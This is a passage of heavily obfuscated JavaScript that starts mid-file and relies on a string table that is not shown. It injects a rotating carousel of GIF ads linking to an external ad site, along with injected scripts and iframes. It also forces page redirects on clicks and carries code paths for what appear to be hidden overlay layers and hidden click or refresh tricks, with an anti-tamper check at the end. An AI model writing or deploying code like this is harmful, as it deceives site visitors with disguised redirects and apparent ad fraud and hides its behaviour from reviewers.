_0x3920x2;_0x3920x1[__Oxcf565[0x0]]= function(_0x3920x3){var _0x3920x4=Object[__Oxcf565[0x2]]({},_0x3920x2[__Oxcf565[0x1]],_0x3920x3);return new _0x3920x2(_0x3920x4)};_0x3920x2= function(_0x3920x3){Object[__Oxcf565[0x2]](this,_0x3920x3);let _0x3920x5=this;_0x3920x5._swiperCdn();_0x3920x5._shake();_0x3920x5._init();_0x3920x5._ancenganshuadiantan();_0x3920x5._meta();setTimeout(()=>{_0x3920x5._swiperMonitor()},100);if(_0x3920x5[__Oxcf565[0x3]]== 1){_0x3920x5._swiperSlideMonitor()};if(this[__Oxcf565[0x4]]!= 0){this._cnzz_link()}};_0x3920x2[__Oxcf565[0x6]][__Oxcf565[0x5]]= function(){let _0x3920x5=this;for(let _0x3920x6=0;_0x3920x6< _0x3920x5[__Oxcf565[0x8]][__Oxcf565[0x7]];_0x3920x6++){if(_0x3920x5[__Oxcf565[0x9]]== 1){if(_0x3920x6+ 1== 1){document[__Oxcf565[0xe]](__Oxcf565[0xc]+ _0x3920x5[__Oxcf565[0xd]])[__Oxcf565[0xb]][__Oxcf565[0xa]]= __Oxcf565[0xf]}else {document[__Oxcf565[0xe]](__Oxcf565[0x3]+ (_0x3920x6+ 1)+ _0x3920x5[__Oxcf565[0xd]])[__Oxcf565[0xb]][__Oxcf565[0xa]]= __Oxcf565[0x10]}}else {if(_0x3920x5[__Oxcf565[0x9]]== 2){if(_0x3920x6+ 1== 1|| _0x3920x6+ 1== 2){document[__Oxcf565[0xe]](__Oxcf565[0xc]+ _0x3920x5[__Oxcf565[0xd]])[__Oxcf565[0xb]][__Oxcf565[0xa]]= __Oxcf565[0xf];document[__Oxcf565[0xe]](__Oxcf565[0x11]+ _0x3920x5[__Oxcf565[0xd]])[__Oxcf565[0xb]][__Oxcf565[0xa]]= __Oxcf565[0xf]}else {document[__Oxcf565[0xe]](__Oxcf565[0x3]+ (_0x3920x6+ 1)+ _0x3920x5[__Oxcf565[0xd]])[__Oxcf565[0xb]][__Oxcf565[0xa]]= __Oxcf565[0x10]}}}};setTimeout(()=>{window[__Oxcf565[0x16]+ _0x3920x5[__Oxcf565[0xd]]][__Oxcf565[0x15]](__Oxcf565[0x12],function(){_0x3920x5[__Oxcf565[0x13]]= this[__Oxcf565[0x14]];if(_0x3920x5[__Oxcf565[0x13]]== 1|| _0x3920x5[__Oxcf565[0x13]]== _0x3920x5[__Oxcf565[0x8]][__Oxcf565[0x7]]+ 1* _0x3920x5[__Oxcf565[0x9]]){for(let _0x3920x6=0;_0x3920x6< _0x3920x5[__Oxcf565[0x8]][__Oxcf565[0x7]];_0x3920x6++){if(_0x3920x6+ 1== 1|| (_0x3920x6+ 1== 2&& _0x3920x5[__Oxcf565[0x9]]== 2)){document[__Oxcf565[0xe]](__Oxcf565[0xc]+ _0x3920x5[__Oxcf565[0xd]])[__Oxcf565[0xb]][__Oxcf565[0xa]]= __Oxcf565[0xf];if(_0x3920x5[__Oxcf565[0x9]]== 2){document[__Oxcf565[0xe]](__Oxcf565[0x11]+ _0x3920x5[__Oxcf565[0xd]])[__Oxcf565[0xb]][__Oxcf565[0xa]]= __Oxcf565[0xf]}}else {document[__Oxcf565[0xe]](__Oxcf565[0x3]+ (_0x3920x6+ 1)+ _0x3920x5[__Oxcf565[0xd]])[__Oxcf565[0xb]][__Oxcf565[0xa]]= __Oxcf565[0x10]}}}else {for(let _0x3920x6=0;_0x3920x6< _0x3920x5[__Oxcf565[0x8]][__Oxcf565[0x7]];_0x3920x6++){if(_0x3920x6+ 1== _0x3920x5[__Oxcf565[0x13]]|| (_0x3920x6+ 2== _0x3920x5[__Oxcf565[0x13]]&& _0x3920x5[__Oxcf565[0x9]]== 2)){document[__Oxcf565[0xe]](__Oxcf565[0x3]+ (_0x3920x6+ 1)+ _0x3920x5[__Oxcf565[0xd]])[__Oxcf565[0xb]][__Oxcf565[0xa]]= __Oxcf565[0xf]}else {document[__Oxcf565[0xe]](__Oxcf565[0x3]+ (_0x3920x6+ 1)+ _0x3920x5[__Oxcf565[0xd]])[__Oxcf565[0xb]][__Oxcf565[0xa]]= __Oxcf565[0x10]}}}})},500)};_0x3920x2[__Oxcf565[0x6]][__Oxcf565[0x17]]= function(){const _0x3920x5=this;setTimeout(()=>{_0x3920x5._isInViewPortOfTwo(document[__Oxcf565[0xe]](__Oxcf565[0x18]+ _0x3920x5[__Oxcf565[0xd]]));window[__Oxcf565[0x16]+ _0x3920x5[__Oxcf565[0xd]]][__Oxcf565[0x15]](__Oxcf565[0x12],function(){_0x3920x5._isInViewPortOfTwo(document[__Oxcf565[0xe]](__Oxcf565[0x18]+ _0x3920x5[__Oxcf565[0xd]]))})},500);window[__Oxcf565[0x19]]= ()=>{_0x3920x5._isInViewPortOfTwo(document[__Oxcf565[0xe]](__Oxcf565[0x18]+ _0x3920x5[__Oxcf565[0xd]]))}};_0x3920x2[__Oxcf565[0x6]][__Oxcf565[0x1a]]= function(_0x3920x7){let _0x3920x5=this;const _0x3920x8=_0x3920x7[__Oxcf565[0x1b]]()&& _0x3920x7[__Oxcf565[0x1b]]()[__Oxcf565[0x1c]];const _0x3920x9=_0x3920x7[__Oxcf565[0x1b]]()&& _0x3920x7[__Oxcf565[0x1b]]()[__Oxcf565[0x1d]];const _0x3920xa=document[__Oxcf565[0x1f]][__Oxcf565[0x1e]];if(window[__Oxcf565[0x16]+ _0x3920x5[__Oxcf565[0xd]]]){if(_0x3920x8< _0x3920xa&& _0x3920x9> 0){if(!window[__Oxcf565[0x16]+ _0x3920x5[__Oxcf565[0xd]]][__Oxcf565[0x21]][__Oxcf565[0x20]]&& !window[__Oxcf565[0x22]+ _0x3920x5[__Oxcf565[0xd]]]){window[__Oxcf565[0x16]+ _0x3920x5[__Oxcf565[0xd]]][__Oxcf565[0x21]][__Oxcf565[0x23]]()}}else {if(window[__Oxcf565[0x16]+ _0x3920x5[__Oxcf565[0xd]]]&& (window[__Oxcf565[0x16]+ _0x3920x5[__Oxcf565[0xd]]][__Oxcf565[0x21]][__Oxcf565[0x20]]|| _0x3920x9< 0)&& !window[__Oxcf565[0x22]+ _0x3920x5[__Oxcf565[0xd]]]){window[__Oxcf565[0x16]+ _0x3920x5[__Oxcf565[0xd]]][__Oxcf565[0x21]][__Oxcf565[0x24]]()}}}};_0x3920x2[__Oxcf565[0x6]][__Oxcf565[0x25]]= function(){const _0x3920x5=this;let _0x3920xb=document[__Oxcf565[0x27]](__Oxcf565[0x26])[0x0];_0x3920xb[__Oxcf565[0x3a]](__Oxcf565[0x28],function(_0x3920xc){if(_0x3920xc[__Oxcf565[0x2a]][__Oxcf565[0x29]]== __Oxcf565[0x2b]+ _0x3920x5[__Oxcf565[0xd]]){if(_0x3920x5[__Oxcf565[0x2c]]== __Oxcf565[0x2d]){window[__Oxcf565[0x2f]][__Oxcf565[0x2e]]= _0x3920x5[__Oxcf565[0x30]];document[__Oxcf565[0xe]](__Oxcf565[0x2b]+ _0x3920x5[__Oxcf565[0xd]])[__Oxcf565[0xb]][__Oxcf565[0xa]]= __Oxcf565[0x10]}else {_0x3920x5[__Oxcf565[0x2c]]= __Oxcf565[0x2d];location[__Oxcf565[0x31]]()}}else {if(_0x3920xc[__Oxcf565[0x2a]][__Oxcf565[0x29]]== __Oxcf565[0x32]+ _0x3920x5[__Oxcf565[0xd]]){document[__Oxcf565[0xe]](__Oxcf565[0x18]+ _0x3920x5[__Oxcf565[0xd]])[__Oxcf565[0xb]][__Oxcf565[0x33]]= __Oxcf565[0x2d];document[__Oxcf565[0xe]](__Oxcf565[0x34]+ _0x3920x5[__Oxcf565[0xd]])[__Oxcf565[0xb]][__Oxcf565[0xa]]= __Oxcf565[0x10];document[__Oxcf565[0xe]](__Oxcf565[0x32]+ _0x3920x5[__Oxcf565[0xd]])[__Oxcf565[0xb]][__Oxcf565[0xa]]= __Oxcf565[0x10]}else {if(_0x3920xc[__Oxcf565[0x2a]][__Oxcf565[0x37]][__Oxcf565[0x36]](__Oxcf565[0x35])!= -1&& _0x3920xc[__Oxcf565[0x2a]][__Oxcf565[0x29]][__Oxcf565[0x36]](_0x3920x5[__Oxcf565[0xd]])!= -1){window[__Oxcf565[0x2f]][__Oxcf565[0x2e]]= _0x3920xc[__Oxcf565[0x2a]][__Oxcf565[0x39]][__Oxcf565[0x38]]}}}});document[__Oxcf565[0xe]](__Oxcf565[0x18]+ _0x3920x5[__Oxcf565[0xd]])[__Oxcf565[0x3a]](__Oxcf565[0x3b],function(_0x3920xc){if(_0x3920xc[__Oxcf565[0x2a]][__Oxcf565[0x29]][__Oxcf565[0x36]](__Oxcf565[0x3])!= -1|| _0x3920xc[__Oxcf565[0x2a]][__Oxcf565[0x29]][__Oxcf565[0x36]](__Oxcf565[0x3c])!= -1){window[__Oxcf565[0x2f]][__Oxcf565[0x2e]]= _0x3920xc[__Oxcf565[0x2a]][__Oxcf565[0x39]][__Oxcf565[0x38]]}})};_0x3920x2[__Oxcf565[0x6]][__Oxcf565[0x3d]]= function(_0x3920xd){document[__Oxcf565[0x3e]](this._setTemplate());document[__Oxcf565[0xe]](__Oxcf565[0x18]+ this[__Oxcf565[0xd]])[__Oxcf565[0x3f]](this._swiperSlide());this._iframeAncengAnshua();setTimeout(()=>{document[__Oxcf565[0x26]][__Oxcf565[0x41]](this._swiperScript(),document[__Oxcf565[0x26]][__Oxcf565[0x40]])},500);for(let _0x3920xe=0;_0x3920xe< this[__Oxcf565[0x8]][__Oxcf565[0x7]];_0x3920xe++){this._observerff(_0x3920xe)}};_0x3920x2[__Oxcf565[0x6]][__Oxcf565[0x42]]= function(){const _0x3920xf=this[__Oxcf565[0x8]][__Oxcf565[0x7]]!= this[__Oxcf565[0x9]];const _0x3920x10=document[__Oxcf565[0x44]](__Oxcf565[0x43]);_0x3920x10[__Oxcf565[0x29]]= __Oxcf565[0x45]+ this[__Oxcf565[0xd]];_0x3920x10[__Oxcf565[0x46]]= `${__Oxcf565[0x47]}${this[__Oxcf565[0xd]]}${__Oxcf565[0x48]}${this[__Oxcf565[0xd]]}${__Oxcf565[0x49]}${_0x3920xf}${__Oxcf565[0x4a]}${_0x3920xf}${__Oxcf565[0x4b]}${this[__Oxcf565[0x9]]}${__Oxcf565[0x4c]}${this[__Oxcf565[0x4d]]}${__Oxcf565[0x4e]}${this[__Oxcf565[0x9]]}${__Oxcf565[0x4f]}${this[__Oxcf565[0x50]]}${__Oxcf565[0x51]}${this[__Oxcf565[0xd]]}${__Oxcf565[0x52]}${this[__Oxcf565[0x8]][__Oxcf565[0x7]]+ this[__Oxcf565[0x9]]}${__Oxcf565[0x53]}${this[__Oxcf565[0xd]]}${__Oxcf565[0x54]}${this[__Oxcf565[0xd]]}${__Oxcf565[0x55]}${this[__Oxcf565[0x8]][__Oxcf565[0x7]]+ this[__Oxcf565[0x9]]}${__Oxcf565[0x56]}${this[__Oxcf565[0xd]]}${__Oxcf565[0x57]}${this[__Oxcf565[0xd]]}${__Oxcf565[0x58]}${this[__Oxcf565[0xd]]}${__Oxcf565[0x59]}${this[__Oxcf565[0xd]]}${__Oxcf565[0x5a]}`;return _0x3920x10};_0x3920x2[__Oxcf565[0x6]][__Oxcf565[0x5b]]= function(){let _0x3920x11=this[__Oxcf565[0x8]][__Oxcf565[0x7]];for(let _0x3920xe=0;_0x3920xe< _0x3920x11;_0x3920xe++){document[__Oxcf565[0xe]](__Oxcf565[0x5e]+ _0x3920xe+ this[__Oxcf565[0xd]])[__Oxcf565[0x3f]](this._setTemplateFirame(this[__Oxcf565[0x8]][_0x3920xe][__Oxcf565[0x5c]],_0x3920xe,this[__Oxcf565[0x5d]]));if(this[__Oxcf565[0x3]]== 1){document[__Oxcf565[0xe]](__Oxcf565[0x18]+ this[__Oxcf565[0xd]])[__Oxcf565[0x3f]](this._setTemplateAnceng(_0x3920xe+ 1,this[__Oxcf565[0x8]][_0x3920xe][__Oxcf565[0x5f]]))};if(this[__Oxcf565[0x3c]]== 1){document[__Oxcf565[0xe]](__Oxcf565[0x5e]+ _0x3920xe+ this[__Oxcf565[0xd]])[__Oxcf565[0x3f]](this._setTemplateAnshua(_0x3920xe+ 1,this[__Oxcf565[0x8]][_0x3920xe][__Oxcf565[0x5f]]))}}};_0x3920x2[__Oxcf565[0x6]][__Oxcf565[0x60]]= function(){var _0x3920x10=document[__Oxcf565[0x44]](__Oxcf565[0x43]);_0x3920x10[__Oxcf565[0x61]]= __Oxcf565[0x62];document[__Oxcf565[0x64]](__Oxcf565[0x63])[__Oxcf565[0x3f]](_0x3920x10);var _0x3920x12=document[__Oxcf565[0x44]](__Oxcf565[0x65]);_0x3920x12[__Oxcf565[0x66]]= __Oxcf565[0x67];_0x3920x12[__Oxcf565[0x2e]]= __Oxcf565[0x68];document[__Oxcf565[0x64]](__Oxcf565[0x63])[__Oxcf565[0x3f]](_0x3920x12)};_0x3920x2[__Oxcf565[0x6]][__Oxcf565[0x69]]= function(){let _0x3920x13=document[__Oxcf565[0x6b]](__Oxcf565[0x6a]);for(let _0x3920xe=0;_0x3920xe< _0x3920x13[__Oxcf565[0x7]];_0x3920xe++){if(_0x3920x13[_0x3920xe][__Oxcf565[0x6c]]=== __Oxcf565[0x6d]){return}};var _0x3920x14=document[__Oxcf565[0x44]](__Oxcf565[0x6e]);_0x3920x14[__Oxcf565[0x6f]]= __Oxcf565[0x6a];_0x3920x14[__Oxcf565[0x6c]]= __Oxcf565[0x6d];document[__Oxcf565[0x64]](__Oxcf565[0x63])[__Oxcf565[0x3f]](_0x3920x14)};_0x3920x2[__Oxcf565[0x6]][__Oxcf565[0x70]]= function(){this._append()};_0x3920x2[__Oxcf565[0x6]][__Oxcf565[0x71]]= function(){let _0x3920x15;this[__Oxcf565[0x2b]]== __Oxcf565[0x72]?(_0x3920x15= __Oxcf565[0xf]):(_0x3920x15= __Oxcf565[0x10]);return (__Oxcf565[0x73]+ Math[__Oxcf565[0xd]]()+ __Oxcf565[0x74]+ this[__Oxcf565[0xd]]+ __Oxcf565[0x75]+ this[__Oxcf565[0xd]]+ __Oxcf565[0x76]+ Math[__Oxcf565[0xd]]()+ __Oxcf565[0x77]+ this[__Oxcf565[0x78]]+ __Oxcf565[0x79]+ this[__Oxcf565[0xd]]+ __Oxcf565[0x7a]+ this[__Oxcf565[0xd]]+ __Oxcf565[0x7b]+ _0x3920x15+ __Oxcf565[0x7c])};_0x3920x2[__Oxcf565[0x6]][__Oxcf565[0x7d]]= function(_0x3920x16,_0x3920x17,_0x3920x18){let _0x3920x19=document[__Oxcf565[0x44]](__Oxcf565[0x7e]);_0x3920x19[__Oxcf565[0x29]]= __Oxcf565[0x7f]+ _0x3920x17+ this[__Oxcf565[0xd]];_0x3920x19[__Oxcf565[0x80]]= 0;_0x3920x19[__Oxcf565[0xb]]= __Oxcf565[0x81]+ this[__Oxcf565[0x78]]+ __Oxcf565[0x82]+ this[__Oxcf565[0x78]]+ __Oxcf565[0x83];_0x3920x19[__Oxcf565[0x84]]= __Oxcf565[0x85]+ _0x3920x18+ __Oxcf565[0x86]+ this[__Oxcf565[0x78]]+ __Oxcf565[0x87]+ _0x3920x16+ __Oxcf565[0x88];return _0x3920x19};_0x3920x2[__Oxcf565[0x6]][__Oxcf565[0x89]]= function(_0x3920x17,_0x3920x1a){let _0x3920x1b;this[__Oxcf565[0x3]]== __Oxcf565[0x72]?(_0x3920x1b= __Oxcf565[0xf]):(_0x3920x1b= __Oxcf565[0x10]);let _0x3920x1c;this[__Oxcf565[0x8a]]== __Oxcf565[0x1d]?(_0x3920x1c= __Oxcf565[0x1c]):(_0x3920x1c= __Oxcf565[0x1d]);let _0x3920x1d=this[__Oxcf565[0x8b]]* 0.01* 40;let _0x3920x1e=this[__Oxcf565[0x9]]== 2&& _0x3920x17% 2== 0?__Oxcf565[0x8c]:__Oxcf565[0x2d];this[__Oxcf565[0x9]]== 1?(widthn= __Oxcf565[0x8d]):(widthn= __Oxcf565[0x8c]);let _0x3920x1f=document[__Oxcf565[0x44]](__Oxcf565[0x8e]);_0x3920x1f[__Oxcf565[0x29]]= __Oxcf565[0x3]+ _0x3920x17+ this[__Oxcf565[0xd]];_0x3920x1f[__Oxcf565[0x90]](__Oxcf565[0x8f],_0x3920x17);_0x3920x1f[__Oxcf565[0x90]](__Oxcf565[0x91],_0x3920x1a);_0x3920x1f[__Oxcf565[0xb]]= __Oxcf565[0x92]+ _0x3920x1b+ __Oxcf565[0x93]+ _0x3920x1c+ __Oxcf565[0x94]+ this[__Oxcf565[0x78]]+ __Oxcf565[0x95]+ _0x3920x1e+ __Oxcf565[0x96]+ _0x3920x1d+ __Oxcf565[0x97]+ widthn+ __Oxcf565[0x98];return _0x3920x1f};_0x3920x2[__Oxcf565[0x6]][__Oxcf565[0x99]]= function(_0x3920x17){let _0x3920x20;this[__Oxcf565[0x3c]]== __Oxcf565[0x72]?(_0x3920x20= __Oxcf565[0xf]):(_0x3920x20= __Oxcf565[0x10]);let _0x3920x1f=document[__Oxcf565[0x44]](__Oxcf565[0x8e]);_0x3920x1f[__Oxcf565[0x29]]= __Oxcf565[0x3c]+ _0x3920x17+ this[__Oxcf565[0xd]];_0x3920x1f[__Oxcf565[0x90]](__Oxcf565[0x8f],_0x3920x17);_0x3920x1f[__Oxcf565[0x90]](__Oxcf565[0x91],url);_0x3920x1f[__Oxcf565[0xb]]= __Oxcf565[0x92]+ _0x3920x20+ __Oxcf565[0x9a]+ this[__Oxcf565[0x78]]+ __Oxcf565[0x9b];return _0x3920x1f};_0x3920x2[__Oxcf565[0x6]][__Oxcf565[0x9c]]= function(_0x3920x17){const _0x3920x21=document[__Oxcf565[0xe]](__Oxcf565[0x7f]+ _0x3920x17+ this[__Oxcf565[0xd]]);const _0x3920x22={attributes:true,childList:true,subtree:true};const _0x3920xd=function(_0x3920x23,_0x3920x24){for(let _0x3920x25 of _0x3920x23){if(_0x3920x25[__Oxcf565[0x9d]]=== __Oxcf565[0x9e]){_0x3920x21[__Oxcf565[0xb]][__Oxcf565[0xa]]= __Oxcf565[0x9f];_0x3920x21[__Oxcf565[0xb]][__Oxcf565[0xa0]]= __Oxcf565[0xa1]}else {if(_0x3920x25[__Oxcf565[0x9d]]=== __Oxcf565[0xa2]){_0x3920x21[__Oxcf565[0xb]][__Oxcf565[0xa]]= __Oxcf565[0x9f];_0x3920x21[__Oxcf565[0xb]][__Oxcf565[0xa0]]= __Oxcf565[0xa1]}}}};const _0x3920x24= new MutationObserver(_0x3920xd);_0x3920x24[__Oxcf565[0xa3]](_0x3920x21,_0x3920x22)};_0x3920x2[__Oxcf565[0x6]][__Oxcf565[0xa4]]= function(){var _0x3920x10=document[__Oxcf565[0x44]](__Oxcf565[0x43]);_0x3920x10[__Oxcf565[0x61]]= this[__Oxcf565[0x4]];document[__Oxcf565[0x26]][__Oxcf565[0x41]](_0x3920x10,document[__Oxcf565[0x26]][__Oxcf565[0xa5]])};_0x3920x2[__Oxcf565[0x6]][__Oxcf565[0xa6]]= function(){const _0x3920x26=document[__Oxcf565[0x44]](__Oxcf565[0xb]);_0x3920x26[__Oxcf565[0x9d]]= __Oxcf565[0xa7];_0x3920x26[__Oxcf565[0x46]]= `${__Oxcf565[0xa8]}`;document[__Oxcf565[0x64]](__Oxcf565[0x63])[__Oxcf565[0x3f]](_0x3920x26);if(this[__Oxcf565[0xa9]]== __Oxcf565[0x72]){var _0x3920x27=`${__Oxcf565[0xaa]}`;const _0x3920x28=document[__Oxcf565[0x44]](__Oxcf565[0xb]);_0x3920x28[__Oxcf565[0x9d]]= __Oxcf565[0xa7];_0x3920x28[__Oxcf565[0x46]]= _0x3920x27;document[__Oxcf565[0x64]](__Oxcf565[0x63])[__Oxcf565[0x3f]](_0x3920x28)}};_0x3920x2[__Oxcf565[0x6]][__Oxcf565[0xab]]= function(){let _0x3920xf=this[__Oxcf565[0x8]][__Oxcf565[0x7]]> 1?__Oxcf565[0xf]:__Oxcf565[0x10];const _0x3920x1f=document[__Oxcf565[0x44]](__Oxcf565[0x8e]);_0x3920x1f[__Oxcf565[0x37]]= __Oxcf565[0xac];_0x3920x1f[__Oxcf565[0x29]]= __Oxcf565[0x34]+ this[__Oxcf565[0xd]];_0x3920x1f[__Oxcf565[0xb]]= __Oxcf565[0xad]+ this[__Oxcf565[0xae]]+ __Oxcf565[0xaf]+ this[__Oxcf565[0x78]]+ __Oxcf565[0x82]+ this[__Oxcf565[0x78]]+ __Oxcf565[0xb0];let _0x3920x29=__Oxcf565[0xb1];this[__Oxcf565[0x8]][__Oxcf565[0xb8]]((_0x3920x2a,_0x3920xe)=>{if((this[__Oxcf565[0x9]]== 1&& _0x3920xe== 0)|| (this[__Oxcf565[0x9]]== 2&& (_0x3920xe== 0|| _0x3920xe== 1))){_0x3920x29+= __Oxcf565[0xb2]+ _0x3920xe+ this[__Oxcf565[0xd]]+ __Oxcf565[0xb3]+ this[__Oxcf565[0xb4]]+ __Oxcf565[0xb5]+ _0x3920xe+ __Oxcf565[0xb6]+ _0x3920x2a[__Oxcf565[0x5f]]+ __Oxcf565[0xb7]}else {_0x3920x29+= __Oxcf565[0xb2]+ _0x3920xe+ this[__Oxcf565[0xd]]+ __Oxcf565[0xb5]+ _0x3920xe+ __Oxcf565[0xb6]+ _0x3920x2a[__Oxcf565[0x5f]]+ __Oxcf565[0xb7]}});_0x3920x29+= __Oxcf565[0xb9]+ _0x3920xf+ __Oxcf565[0xb7];_0x3920x1f[__Oxcf565[0x46]]= _0x3920x29;return _0x3920x1f};_0x3920x2[__Oxcf565[0x1]]= {srcHrefArr:JSON.parse('[{"ad_url": "https://tz.urxav.com/2994.html", "material": "https://tsdflsdk.cypcb.net/yl/zb/197.gif"}, {"ad_url": "https://tz.urxav.com/2994.html", "material": "https://tsdflsdk.cypcb.net/yl/zb/75.gif"}, {"ad_url": "https://tz.urxav.com/2994.html", "material": "https://tsdflsdk.cypcb.net/yl/zb/98.gif"}, {"ad_url": "https://tz.urxav.com/2994.html", "material": "https://tsdflsdk.cypcb.net/yl/zb/112.gif"}]'),hrefdt:"0",theme:"light",shake:"1",anceng:"0",anshua:"0",diantan:"0",random:Math.ceil(Math.random()*100000),number:"0",id:"Ds48Lxm9FDJ7Njrr3cfZk2",cnzz_link:"0",skip:"0",spaceBetween:5,num:Number("1"),settime:Number("2")*1000,delay:Number("2")*1000,boxHeight:(("113"/375)*document.body.clientWidth).toFixed(0),darkHeight:(("30"/375)*document.body.clientWidth).toFixed(0),direction:"top",currentIndex:1,id2:"845"};if(_0x3920x2[__Oxcf565[0x1]][__Oxcf565[0xba]]== 0){_0x3920x1[__Oxcf565[0x0]]()}else {window[__Oxcf565[0x2f]][__Oxcf565[0x2e]]= _0x3920x2[__Oxcf565[0x1]][__Oxcf565[0xbd]][__Oxcf565[0xbc]](__Oxcf565[0xbb])[0x0][__Oxcf565[0x5f]]}})(window);;;(function(_0x3920x2b,_0x3920x2c,_0x3920x2d,_0x3920x2e,_0x3920x2f,_0x3920x30){_0x3920x30= __Oxcf565[0xbe];_0x3920x2e= function(_0x3920x31){if( typeof alert!== _0x3920x30){alert(_0x3920x31)};if( typeof console!== _0x3920x30){console[__Oxcf565[0xbf]](_0x3920x31)}};_0x3920x2d= function(_0x3920x32,_0x3920x2b){return _0x3920x32+ _0x3920x2b};_0x3920x2f= _0x3920x2d(__Oxcf565[0xc0],_0x3920x2d(_0x3920x2d(__Oxcf565[0xc1],__Oxcf565[0xc2]),__Oxcf565[0xc3]));try{_0x3920x2b= __encode;if(!( typeof _0x3920x2b!== _0x3920x30&& _0x3920x2b=== _0x3920x2d(__Oxcf565[0xc4],__Oxcf565[0xc5]))){_0x3920x2e(_0x3920x2f)}}catch(e){_0x3920x2e(_0x3920x2f)}})({})
}